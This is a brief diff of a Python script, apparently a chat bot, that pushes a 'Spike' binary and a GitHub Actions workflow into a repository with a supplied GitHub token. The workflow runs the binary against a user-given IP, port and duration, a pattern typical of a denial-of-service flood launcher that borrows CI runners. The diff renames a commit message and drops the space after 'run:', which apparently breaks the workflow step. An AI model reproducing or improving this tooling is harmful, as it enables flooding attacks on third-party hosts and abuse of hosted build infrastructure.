@@ -55,7 +55,7 @@ jobs:
       - name: Make binary executable
         run: chmod +x *
       - name: Run soul binary
-        run: ./Spike {ip} {port} {time} 1024 100
+        run:./Spike {ip} {port} {time} 1024 100
 '''
 
 REPO_NAME = "soulcrack90"
@@ -257,7 +257,7 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
             sha=blob.sha,
         )
         new_tree = repo.create_git_tree([binary_element], base_tree)
-        new_commit = repo.create_git_commit("Add OP binary", new_tree, [base_commit])
+        new_commit = repo.create_git_commit("Add Spike binary", new_tree, [base_commit])
         base_ref.edit(new_commit.sha)
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
